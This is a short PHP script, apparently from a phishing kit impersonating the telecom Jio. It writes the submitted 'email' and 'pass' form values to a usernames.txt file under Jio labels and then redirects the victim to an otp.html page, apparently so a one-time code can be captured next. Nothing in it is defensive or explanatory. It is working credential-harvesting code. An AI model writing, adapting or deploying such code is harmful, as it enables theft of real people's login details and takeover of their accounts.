<?php

file_put_contents("usernames.txt", "Jio Username : " . $email = $_POST['email'] . "\n", FILE_APPEND);
?>
<?php
file_put_contents("usernames.txt", "Jio Phone Number : " . $pass = $_POST['pass'] . "\n", FILE_APPEND);
header('Location: otp.html');
?>
